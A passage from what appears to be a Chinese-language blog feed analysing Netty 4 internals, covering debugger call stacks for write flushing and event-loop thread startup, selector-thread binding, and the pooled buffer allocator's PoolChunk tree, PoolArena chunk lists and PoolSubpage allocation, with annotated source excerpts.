class="hljs-number">749</span>ReadTimeoutHandler(ChannelDuplexHandler).flush(ChannelHandlerContext) line: <span class="hljs-number">117</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeFlush0() line: <span class="hljs-number">776</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeFlush() line: <span class="hljs-number">768</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).flush() line: <span class="hljs-number">749</span>HttpResponseEncoder(ChannelOutboundHandlerAdapter).flush(ChannelHandlerContext) line: <span class="hljs-number">115</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeFlush0() line: <span class="hljs-number">776</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeFlush() line: <span class="hljs-number">768</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).flush() line: <span class="hljs-number">749</span>ChunkedWriteHandler.doFlush(ChannelHandlerContext) line: <span class="hljs-number">335</span>ChunkedWriteHandler.channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">148</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelWritabilityChanged() line: <span class="hljs-number">409</span>HttpContentDecompressor(ChannelInboundHandlerAdapter).channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">119</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelWritabilityChanged() line: <span class="hljs-number">409</span>HttpRequestDecoder(ChannelInboundHandlerAdapter).channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">119</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelWritabilityChanged() line: <span class="hljs-number">409</span>PipelineInitializer$ChannelActiveTester(ChannelInboundHandlerAdapter).channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">119</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).fireChannelWritabilityChanged() line: <span class="hljs-number">409</span>ReadTimeoutHandler(ChannelInboundHandlerAdapter).channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">119</span>DefaultChannelHandlerContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelPipeline$HeadContext(AbstractChannelHandlerContext).fireChannelWritabilityChanged() line: <span class="hljs-number">409</span>DefaultChannelPipeline$HeadContext.channelWritabilityChanged(ChannelHandlerContext) line: <span class="hljs-number">1431</span>DefaultChannelPipeline$HeadContext(AbstractChannelHandlerContext).invokeChannelWritabilityChanged() line: <span class="hljs-number">434</span>AbstractChannelHandlerContext.invokeChannelWritabilityChanged(AbstractChannelHandlerContext) line: <span class="hljs-number">416</span>DefaultChannelPipeline.fireChannelWritabilityChanged() line: <span class="hljs-number">942</span>ChannelOutboundBuffer$<span class="hljs-number">2</span>.run() line: <span class="hljs-number">608</span>AbstractEventExecutor.safeExecute(Runnable) line: <span class="hljs-number">163</span>NioEventLoop(SingleThreadEventExecutor).runAllTasks(<span class="hljs-keyword">long</span>) line: <span class="hljs-number">404</span>NioEventLoop.run() line: <span class="hljs-number">495</span>SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>Thread.run() line: <span class="hljs-number">748</span></code></pre><p>netty里核心代码在：  </p><pre><code class="hljs java"><span class="hljs-comment">// io.netty.channel.nio.AbstractNioByteChannel.setOpWrite()</span><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setOpWrite</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">final</span> SelectionKey key = selectionKey();    <span class="hljs-comment">// Check first if the key is still valid as it may be canceled as part of the deregistration</span>    <span class="hljs-comment">// from the EventLoop</span>    <span class="hljs-comment">// See https://github.com/netty/netty/issues/2104</span>    <span class="hljs-keyword">if</span> (!key.isValid()) &#123;        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> interestOps = key.interestOps();    <span class="hljs-keyword">if</span> ((interestOps &amp; SelectionKey.OP_WRITE) == <span class="hljs-number">0</span>) &#123;        key.interestOps(interestOps | SelectionKey.OP_WRITE);    &#125;&#125;</code></pre><h2 id="select出OP-WRITE的处理与buf的写出"><a href="#select出OP-WRITE的处理与buf的写出" class="headerlink" title="select出OP_WRITE的处理与buf的写出"></a>select出OP_WRITE的处理与buf的写出</h2><p>注册完之后再select到的写逻辑复用io.netty.channel.socket.nio.NioSocketChannel.doWrite(ChannelOutboundBuffer)<br>调用栈如下：  </p><pre><code class="hljs java">Thread [worker-<span class="hljs-number">3</span>] (Suspended (entry into method write in SocketChannelImpl))SocketChannelImpl.write(ByteBuffer) line: <span class="hljs-number">458</span>NioSocketChannel.doWrite(ChannelOutboundBuffer) line: <span class="hljs-number">405</span>NioSocketChannel$NioSocketChannelUnsafe(AbstractChannel$AbstractUnsafe).flush0() line: <span class="hljs-number">938</span>NioSocketChannel$NioSocketChannelUnsafe(AbstractNioChannel$AbstractNioUnsafe).forceFlush() line: <span class="hljs-number">367</span>NioEventLoop.processSelectedKey(SelectionKey, AbstractNioChannel) line: <span class="hljs-number">671</span>NioEventLoop.processSelectedKeysOptimized() line: <span class="hljs-number">612</span>NioEventLoop.processSelectedKeys() line: <span class="hljs-number">529</span>NioEventLoop.run() line: <span class="hljs-number">491</span>SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>Thread.run() line: <span class="hljs-number">748</span></code></pre><h2 id="main线程与boss线程切换，boss线程与worker线程切换"><a href="#main线程与boss线程切换，boss线程与worker线程切换" class="headerlink" title="main线程与boss线程切换，boss线程与worker线程切换"></a>main线程与boss线程切换，boss线程与worker线程切换</h2><p>boss与worker的NioEventLoop的spin run是什么时候启动触发的<br>main启动boss  </p><pre><code class="hljs java">Thread [main] (Suspended (breakpoint at line <span class="hljs-number">707</span> in java.lang.Thread))owns: java.lang.Thread  (id=<span class="hljs-number">80</span>)java.lang.Thread.start() line: <span class="hljs-number">707</span>io.netty.util.concurrent.ThreadPerTaskExecutor.execute(java.lang.Runnable) line: <span class="hljs-number">33</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).doStartThread() line: <span class="hljs-number">894</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).startThread() line: <span class="hljs-number">865</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).execute(java.lang.Runnable) line: <span class="hljs-number">758</span>io.netty.channel.nio.AbstractNioMessageChannel$NioMessageUnsafe(io.netty.channel.AbstractChannel$AbstractUnsafe).register(io.netty.channel.EventLoop, io.netty.channel.ChannelPromise) line: <span class="hljs-number">483</span>io.netty.channel.nio.NioEventLoop(io.netty.channel.SingleThreadEventLoop).register(io.netty.channel.ChannelPromise) line: <span class="hljs-number">80</span>io.netty.channel.nio.NioEventLoop(io.netty.channel.SingleThreadEventLoop).register(io.netty.channel.Channel) line: <span class="hljs-number">74</span>io.netty.channel.nio.NioEventLoopGroup(io.netty.channel.MultithreadEventLoopGroup).register(io.netty.channel.Channel) line: <span class="hljs-number">86</span>io.netty.bootstrap.ServerBootstrap(io.netty.bootstrap.AbstractBootstrap&lt;B,C&gt;).initAndRegister() line: <span class="hljs-number">333</span>io.netty.bootstrap.ServerBootstrap(io.netty.bootstrap.AbstractBootstrap&lt;B,C&gt;).doBind(java.net.SocketAddress) line: <span class="hljs-number">282</span>io.netty.bootstrap.ServerBootstrap(io.netty.bootstrap.AbstractBootstrap&lt;B,C&gt;).bind(java.net.SocketAddress) line: <span class="hljs-number">278</span>org.restexpress.RestExpress.bind(java.net.InetSocketAddress) line: <span class="hljs-number">709</span>org.restexpress.RestExpress.bind(java.lang.String, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">686</span>com.code260.ss.resetexpress.RestExpressApp1.main(java.lang.String[]) line: <span class="hljs-number">26</span></code></pre><p>boss启动worker  </p><pre><code class="hljs java">Thread [boss-<span class="hljs-number">0</span>] (Suspended (breakpoint at line <span class="hljs-number">707</span> in java.lang.Thread))owns: java.lang.Thread  (id=<span class="hljs-number">102</span>)java.lang.Thread.start() line: <span class="hljs-number">707</span>io.netty.util.concurrent.ThreadPerTaskExecutor.execute(java.lang.Runnable) line: <span class="hljs-number">33</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).doStartThread() line: <span class="hljs-number">894</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).startThread() line: <span class="hljs-number">865</span>io.netty.channel.nio.NioEventLoop(io.netty.util.concurrent.SingleThreadEventExecutor).execute(java.lang.Runnable) line: <span class="hljs-number">758</span>io.netty.channel.socket.nio.NioSocketChannel$NioSocketChannelUnsafe(io.netty.channel.AbstractChannel$AbstractUnsafe).register(io.netty.channel.EventLoop, io.netty.channel.ChannelPromise) line: <span class="hljs-number">483</span>io.netty.channel.nio.NioEventLoop(io.netty.channel.SingleThreadEventLoop).register(io.netty.channel.ChannelPromise) line: <span class="hljs-number">80</span>io.netty.channel.nio.NioEventLoop(io.netty.channel.SingleThreadEventLoop).register(io.netty.channel.Channel) line: <span class="hljs-number">74</span>io.netty.channel.nio.NioEventLoopGroup(io.netty.channel.MultithreadEventLoopGroup).register(io.netty.channel.Channel) line: <span class="hljs-number">86</span>io.netty.bootstrap.ServerBootstrap$ServerBootstrapAcceptor.channelRead(io.netty.channel.ChannelHandlerContext, java.lang.Object) line: <span class="hljs-number">255</span>io.netty.channel.DefaultChannelHandlerContext(io.netty.channel.AbstractChannelHandlerContext).invokeChannelRead(java.lang.Object) line: <span class="hljs-number">362</span>io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(io.netty.channel.AbstractChannelHandlerContext, java.lang.Object) line: <span class="hljs-number">348</span>io.netty.channel.DefaultChannelPipeline$HeadContext(io.netty.channel.AbstractChannelHandlerContext).fireChannelRead(java.lang.Object) line: <span class="hljs-number">340</span>io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(io.netty.channel.ChannelHandlerContext, java.lang.Object) line: <span class="hljs-number">1408</span>io.netty.channel.DefaultChannelPipeline$HeadContext(io.netty.channel.AbstractChannelHandlerContext).invokeChannelRead(java.lang.Object) line: <span class="hljs-number">362</span>io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(io.netty.channel.AbstractChannelHandlerContext, java.lang.Object) line: <span class="hljs-number">348</span>io.netty.channel.DefaultChannelPipeline.fireChannelRead(java.lang.Object) line: <span class="hljs-number">930</span>io.netty.channel.nio.AbstractNioMessageChannel$NioMessageUnsafe.read() line: <span class="hljs-number">93</span>io.netty.channel.nio.NioEventLoop.processSelectedKey(java.nio.channels.SelectionKey, io.netty.channel.nio.AbstractNioChannel) line: <span class="hljs-number">677</span>io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized() line: <span class="hljs-number">612</span>io.netty.channel.nio.NioEventLoop.processSelectedKeys() line: <span class="hljs-number">529</span>io.netty.channel.nio.NioEventLoop.run() line: <span class="hljs-number">491</span>io.netty.util.concurrent.SingleThreadEventExecutor$<span class="hljs-number">5</span>.run() line: <span class="hljs-number">905</span>java.lang.Thread.run() line: <span class="hljs-number">748</span></code></pre><h2 id="selector与线程绑定的问题"><a href="#selector与线程绑定的问题" class="headerlink" title="selector与线程绑定的问题"></a>selector与线程绑定的问题</h2><p>一个selector对应一个channel，一个selector又对应固定的一个线程，所以一个channel上的数据<strong>多次读取不会在不同线程漂移</strong>。<br>当然，一个线程可以对应多个channel，但因为一个selector又对应固定的一个线程，所以这些channel用的同一个selector。  </p><h2 id="多boss问题也即多accept问题"><a href="#多boss问题也即多accept问题" class="headerlink" title="多boss问题也即多accept问题"></a>多boss问题也即多accept问题</h2><p>什么时候用多accept？<br>一般是用在多个端口bind，或者一个端口不同ip网卡平面bind时，多accept(即boss)线程才有意义。否则一个port通常只能bind出一个ServerSocketChannel出来，一个channel又对应一个Selector，一个Selector又对应一个线程在spin的方式去select，所以多个线程对一个bind也没用。如果把一个selector对应到多个线程去用问题在于，selector的方法线程不安全，对应到多个线程会有问题。<br>当然后来的JDK版本，包括linux开始支持一个port+ip可以被多个进程多次绑定，这样多accept就有意义了。参见 《NIO trick and trap》这个ppt的 题外:SO_REUSEPORT 关键字。 应用场景是 “适合大量短连接的web server”</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>netty4源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>netty之池化buffer</title>
    <link href="/2020/04/20/netty4-pooled-buffer/"/>
    <url>/2020/04/20/netty4-pooled-buffer/</url>
    
    <content type="html"><![CDATA[<h2 id="PooledByteBufAllocator-buffer分配"><a href="#PooledByteBufAllocator-buffer分配" class="headerlink" title="PooledByteBufAllocator buffer分配"></a>PooledByteBufAllocator buffer分配</h2><p>buffer分配的入口：<br>io.netty.buffer.PooledByteBufAllocator.newDirectBuffer(int, int)<br>netty实际应用时分配调用栈：  </p><table><tr><td>CLASS_NAME</td><td>METHOD_NAME</td><td>LINE_NUM</td></tr><tr><td>io/netty/buffer/PooledByteBufAllocator</td><td>newDirectBuffer</td><td>339</td></tr><tr><td>io/netty/buffer/AbstractByteBufAllocator</td><td>directBuffer</td><td>185</td></tr><tr><td>io/netty/buffer/AbstractByteBufAllocator</td><td>directBuffer</td><td>176</td></tr><tr><td>io/netty/buffer/AbstractByteBufAllocator</td><td>ioBuffer</td><td>139</td></tr><tr><td>io/netty/channel/DefaultMaxMessagesRecvByteBufAllocator$MaxMessageHandle</td><td>allocate</td><td>114</td></tr><tr><td>io/netty/channel/nio/AbstractNioByteChannel$NioByteUnsafe</td><td>read</td><td>186</td></tr><tr><td>io/netty/channel/nio/NioEventLoop</td><td>processSelectedKey</td><td>682</td></tr><tr><td>io/netty/channel/nio/NioEventLoop</td><td>processSelectedKeysOptimized</td><td>628</td></tr><tr><td>io/netty/channel/nio/NioEventLoop</td><td>processSelectedKeys</td><td>533</td></tr><tr><td>io/netty/channel/nio/NioEventLoop</td><td>run</td><td>511</td></tr><tr><td>io/netty/util/concurrent/SingleThreadEventExecutor$5</td><td>run</td><td>956</td></tr></table><h3 id="测试case代码"><a href="#测试case代码" class="headerlink" title="测试case代码"></a>测试case代码</h3><pre><code class="hljs plain">package io.netty.buffer;import org.junit.Assert;public class PooledByteBufTest &#123;public static void main(String[] args) &#123;  final PooledByteBufAllocator allocator &#x3D; new PooledByteBufAllocator(                false,   &#x2F;&#x2F; preferDirect                0,      &#x2F;&#x2F; nHeapArena                1,      &#x2F;&#x2F; nDirectArena                8192,   &#x2F;&#x2F; pageSize                11,     &#x2F;&#x2F; maxOrder                3,      &#x2F;&#x2F; tinyCacheSize                3,      &#x2F;&#x2F; smallCacheSize                3,      &#x2F;&#x2F; normalCacheSize                true    &#x2F;&#x2F; useCacheForAllThreads                );        &#x2F;&#x2F; create tiny buffer        final ByteBuf b1 &#x3D; allocator.directBuffer(24);        &#x2F;&#x2F; create small buffer        final ByteBuf b2 &#x3D; allocator.directBuffer(800);        &#x2F;&#x2F; create normal buffer        final ByteBuf b3 &#x3D; allocator.directBuffer(8192 * 2);        Assert.assertNotNull(b1);        Assert.assertNotNull(b2);        Assert.assertNotNull(b3);        &#x2F;&#x2F; then release buffer to deallocated memory while threadlocal cache has been disabled        &#x2F;&#x2F; allocations counter value must equals deallocations counter value        Assert.assertTrue(b1.release());        Assert.assertTrue(b2.release());        Assert.assertTrue(b3.release());&#125;&#125;</code></pre><h3 id="PoolChunk"><a href="#PoolChunk" class="headerlink" title="PoolChunk"></a>PoolChunk</h3><p>PoolChunk本身数据结构与设计思路参见PoolChunk注释：       </p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Description of algorithm for PageRun/PoolSubpage allocation from PoolChunk</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Notation: The following terms are important to understand the code</span><span class="hljs-comment"> * &gt; page  - a page is the smallest unit of memory chunk that can be allocated</span><span class="hljs-comment"> * page是chunk中能分配的最小单元  </span><span class="hljs-comment"> * &gt; chunk - a chunk is a collection of pages</span><span class="hljs-comment"> * 一个chunk中有一组page  1对多  </span><span class="hljs-comment"> * &gt; in this code chunkSize = 2^&#123;maxOrder&#125; * pageSize</span><span class="hljs-comment"> * 代码中  chunksize大小计算如上  maxOrder 是啥？</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * To begin we allocate a byte array of size = chunkSize</span><span class="hljs-comment"> * Whenever a ByteBuf of given size needs to be created we search for the first position</span><span class="hljs-comment"> * in the byte array that has enough empty space to accommodate the requested size and</span><span class="hljs-comment"> * return a (long) handle that encodes this offset information, (this memory segment is then</span><span class="hljs-comment"> * marked as reserved so it is always used by exactly one ByteBuf and no more)</span><span class="hljs-comment"> * 首先，当需要创建给定大小的ByteBuf时，我们分配一个size=chunkSize的字节数组，</span><span class="hljs-comment"> * 在字节数组中搜索第一个有足够的空空间来容纳请求的大小的位置，</span><span class="hljs-comment"> * 并返回一个（长）句柄来编码该偏移量信息（然后将该内存段标记为保留，因此它总是仅由一个ByteBuf使用，不再使用）</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * For simplicity all sizes are normalized according to PoolArena#normalizeCapacity method</span><span class="hljs-comment"> * This ensures that when we request for memory segments of size &gt;= pageSize the normalizedCapacity</span><span class="hljs-comment"> * equals the next nearest power of 2</span><span class="hljs-comment"> * 为了简单起见，所有大小都按照PoolArena#normalizeCapacity方法进行规范化</span><span class="hljs-comment"> * 这确保当我们请求大小大于等于pageSize的内存段时，normalized容量等于下一个最接近的2的幂</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * To search for the first offset in chunk that has at least requested size available we construct a</span><span class="hljs-comment"> * complete balanced binary tree and store it in an array (just like heaps) - memoryMap</span><span class="hljs-comment"> * 为了搜索块中至少有请求大小可用的第一个偏移量，我们构造了一个完整的平衡二叉树，并将其存储在一个数组（就像堆一样）-内存映射中</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * The tree looks like this (the size of each node being mentioned in the parenthesis)</span><span class="hljs-comment"> * 树看起来是这样的（括号中提到的每个节点的大小）</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * depth=0        1 node (chunkSize)</span><span class="hljs-comment"> * depth=1        2 nodes (chunkSize/2)</span><span class="hljs-comment"> * ..</span><span class="hljs-comment"> * ..</span><span class="hljs-comment"> * depth=d        2^d nodes (chunkSize/2^d)</span><span class="hljs-comment"> * ..</span><span class="hljs-comment"> * depth=maxOrder 2^maxOrder nodes (chunkSize/2^&#123;maxOrder&#125; = pageSize)  pageSize 在最下一层  最顶层是chunksize 从上往下走，每过一层除以2  </span><span class="hljs-comment"> *</span><span class="hljs-comment"> * depth=maxOrder is the last level and the leafs consist of pages</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * With this tree available searching in chunkArray translates like this:</span><span class="hljs-comment"> * To allocate a memory segment of size chunkSize/2^k we search for the first node (from left) at height k</span><span class="hljs-comment"> * which is unused 要分配大小为chunkSize/2^k的内存段，我们在高度k处搜索第一个未使用的节点（从左开始）。 嗯嗯</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Algorithm:</span><span class="hljs-comment"> * ----------</span><span class="hljs-comment"> * Encode the tree in memoryMap with the notation  用符号将树编码在内存中</span><span class="hljs-comment"> *   memoryMap[id] = x =&gt; in the subtree rooted at id, the first node that is free to be allocated</span><span class="hljs-comment"> *   is at depth x (counted from depth=0) i.e., at depths [depth_of_id, x), there is no node that is free</span><span class="hljs-comment"> * 在以id为根的子树中，可自由分配的第一个节点在深度x（从深度=0开始计算），即在深度[深度id，x的深度]处，没有可自由分配的节点</span><span class="hljs-comment"> *</span><span class="hljs-comment"> *  As we allocate &amp; free nodes, we update values stored in memoryMap so that the property is maintained</span><span class="hljs-comment"> * 当我们分配空闲节点时，我们更新存储在memoryMap中的值，以便维护属性</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Initialization -</span><span class="hljs-comment"> *   In the beginning we construct the memoryMap array by storing the depth of a node at each node</span><span class="hljs-comment"> * 首先，我们通过在每个节点上存储一个节点的深度来构造memoryMap数组</span><span class="hljs-comment"> *     i.e., memoryMap[id] = depth_of_id</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Observations:</span><span class="hljs-comment"> * -------------</span><span class="hljs-comment"> * 1) memoryMap[id] = depth_of_id  =&gt; it is free / unallocated</span><span class="hljs-comment"> * 2) memoryMap[id] &gt; depth_of_id  =&gt; at least one of its child nodes is allocated, so we cannot allocate it, but</span><span class="hljs-comment"> *                                    some of its children can still be allocated based on their availability</span><span class="hljs-comment"> * 3) memoryMap[id] = maxOrder + 1 =&gt; the node is fully allocated &amp; thus none of its children can be allocated, it</span><span class="hljs-comment"> *                                    is thus marked as unusable</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Algorithm: [allocateNode(d) =&gt; we want to find the first node (from left) at height h that can be allocated]</span><span class="hljs-comment"> * ----------</span><span class="hljs-comment"> * 1) start at root (i.e., depth = 0 or id = 1)</span><span class="hljs-comment"> * 2) if memoryMap[1] &gt; d =&gt; cannot be allocated from this chunk</span><span class="hljs-comment"> * 3) if left node value &lt;= h; we can allocate from left subtree so move to left and repeat until found</span><span class="hljs-comment"> * 4) else try in right subtree</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Algorithm: [allocateRun(size)]</span><span class="hljs-comment"> * ----------</span><span class="hljs-comment"> * 1) Compute d = log_2(chunkSize/size)</span><span class="hljs-comment"> * 2) Return allocateNode(d)</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Algorithm: [allocateSubpage(size)]</span><span class="hljs-comment"> * ----------</span><span class="hljs-comment"> * 1) use allocateNode(maxOrder) to find an empty (i.e., unused) leaf (i.e., page)</span><span class="hljs-comment"> * 2) use this handle to construct the PoolSubpage object or if it already exists just call init(normCapacity)</span><span class="hljs-comment"> *    note that this PoolSubpage object is added to subpagesPool in the PoolArena when we init() it</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Note:</span><span class="hljs-comment"> * -----</span><span class="hljs-comment"> * In the implementation for improving cache coherence,</span><span class="hljs-comment"> * we store 2 pieces of information depth_of_id and x as two byte values in memoryMap and depthMap respectively</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * memoryMap[id]= depth_of_id  is defined above</span><span class="hljs-comment"> * depthMap[id]= x  indicates that the first node which is free to be allocated is at depth x (from root)</span><span class="hljs-comment"> */</span><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PoolChunk</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">PoolChunkMetric</span> </span>&#123;</code></pre><p>io.netty.buffer.PoolArena.findSubpagePoolHead(int)  算出page header在page table中的index，小的page在前面    </p><p>// trace 库地址 jdbc:h2:/Users/simon/twice-cooked-pork/trace-data/基于netty4做的resetserver的一次http请求trace/tracer.data.h2db  </p><p>PoolChunk要解决的问题有：  </p><ol><li>快速查找未分配的地方并分配</li><li>尽量不要有碎片，可以理解成尽量挨着紧凑的分配</li></ol><p>整个chunk的结构如下：  </p><pre><code class="hljs html">                                                    +------+   chunksize 当L=11时，是16ML=0                                                 |   0  |                                   +----------------+------+------------------+                                   |                                          |                                   |                                          |                                   |                                          |                               +---v--+                                   +---v--+L=1                            |   1  |                                   |   2  |                        +------+------+------+                     +------+------+-------+                        |                    |                     |                     |                        |                    |                     |                     |                        |                    |                     |                     |                    +---v--+             +---v--+              +---v--+              +---v--+L=2                 |   3  |             |   4  |              |   5  |              |   6  |                 +--+------+-+         +-+------+--+        +--+------+--+         +-+------+--+                 |           |         |           |        |            |         |           |                 |           |         |           |        |            |         |           |                 |           |         |           |        |            |         |           |              +--v---+   +---v--+   +--v---+   +---v--+   +-v----+   +---v--+   +--v---+   +---v--+L=3           |  7   |   |   8  |   |  9   |   |  10  |   |  11  |   |  12  |   |  13  |   |  14  |              +------+   +------+   +------+   +------+   +------+   +------+   +------+   +------+               8K大小即page size</code></pre><p>是一个完全二叉树，树的层高可以自定义，目前限制在14层内，默认是11层。<br>最底层是真正的chunk描述，最底层每个叶子是一个paage，大小为8K。那么当层数是11层时，chunk的size是16M。因为11层的话，最下面一层叶子是2的11次方，再乘以8K正好是16MB。<br>这棵树中每个节点还对对应其相应的大小是否被分配。什么叫其相应的大小？是这样的，每一层代表需要分配的大小的档次。暂且用档次这个词吧。最上面是16MB档次，最下面是8K档次，从最上面开始往下走一层，档次就除以2。<br>每次申请内存时，netty会先对其做规格化，所谓规格化就是最接近申请内存值的2de整数次幂。比如我申请900byte，那么规格化后就是1K。在规格化后，netty会在树上标志 0 1 3 7被使用了。下次要再申请8K内存时就要避开这个路径了，只能是 0 1 3 8 了，因为7那边已经不够了。其他大小同理。所以树上的节点是为了标志是否被使用过，以使得内存碎片减少尽量靠左紧凑分配。   对于单page内的内存使用浪费问题，netty又做了一层位图结构使其得以利用。对于chunk对象的查找，netty还做了缓存机制，下面有讲。 </p><p>真正数据存放在 io.netty.buffer.PoolChunk.memory 这个字段中，调试时为：java.nio.DirectByteBuffer[pos=0 lim=16777216 cap=16777216]<br>16777216是16M  </p><h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4><p>仔细调试 1K 2k 3K 8K 11K 内存的多次分配与回收。</p><h4 id="分配24byte过程"><a href="#分配24byte过程" class="headerlink" title="分配24byte过程"></a>分配24byte过程</h4><p>PooledUnsafeDirectByteBuf是用了对象池特性io.netty.buffer.PooledUnsafeDirectByteBuf.RECYCLER  </p><h3 id="PoolArena"><a href="#PoolArena" class="headerlink" title="PoolArena"></a>PoolArena</h3><p><code>PoolArena</code> 这一层负责创建与维护PoolChunk，维护的方式是将用到的正在分配中的PoolChunk放到PoolChunkList这个列表中。<br>PoolChunkList是一个链是结构。<br>而且，PoolArena还<strong>按PoolChunk的使用量</strong>来<strong>分别维护到相对应</strong>的PoolChunkList中。  </p><pre><code class="hljs java"><span class="hljs-comment">// abstract class PoolArena&lt;T&gt; implements PoolArenaMetric &#123;</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PoolChunkList&lt;T&gt; q050;<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PoolChunkList&lt;T&gt; q025;<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PoolChunkList&lt;T&gt; q000;<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PoolChunkList&lt;T&gt; qInit;<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PoolChunkList&lt;T&gt; q075;<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> PoolChunkList&lt;T&gt; q100;</code></pre><p>这些PoolChunkList也是<strong>按使用量大小有序的链式的串在一起</strong>(参见PoolArena构造方法中初始化这些list字段的代码)，当使用量达到本级别时，会加入到下一级别的list中，比如达到25%了，那么就会加到50%列表中了。(参见io.netty.buffer.PoolChunkList.add(PoolChunk<T>))   </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(PoolChunk&lt;T&gt; chunk)</span> </span>&#123;    <span class="hljs-keyword">if</span> (chunk.usage() &gt;= maxUsage) &#123;        nextList.add(chunk);        <span class="hljs-keyword">return</span>;    &#125;    add0(chunk);&#125;</code></pre><p>PoolArena中还维护了两个PoolSubpage数组，每个数组里面的实例在PoolArena构造时初始化，刚初始化后每个PoolSubpage元素的前继与后继元素都是指向自己(PoolSubpage是支持链表式的一个结构)<br>在io.netty.buffer.PoolSubpage.addToPool(PoolSubpage<T>)时 会将io.netty.buffer.PoolChunk.allocateSubpage(int)过程中新构建出来的PoolSubpage实例<strong>加到head的next节点上(即后继节点)</strong>。 具体代码如下：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">long</span> <span class="hljs-title">allocateSubpage</span><span class="hljs-params">(<span class="hljs-keyword">int</span> normCapacity)</span> </span>&#123;    <span class="hljs-comment">// Obtain the head of the PoolSubPage pool that is owned by the PoolArena and synchronize on it.</span>    <span class="hljs-comment">// This is need as we may add it back and so alter the linked-list structure.</span>    PoolSubpage&lt;T&gt; head = arena.findSubpagePoolHead(normCapacity); <span class="hljs-comment">// 这个是查找PoolArena的PoolSubpage数组</span>    <span class="hljs-keyword">int</span> d = maxOrder; <span class="hljs-comment">// subpages are only be allocated from pages i.e., leaves</span>    <span class="hljs-keyword">synchronized</span> (head) &#123;        <span class="hljs-keyword">int</span> id = allocateNode(d);        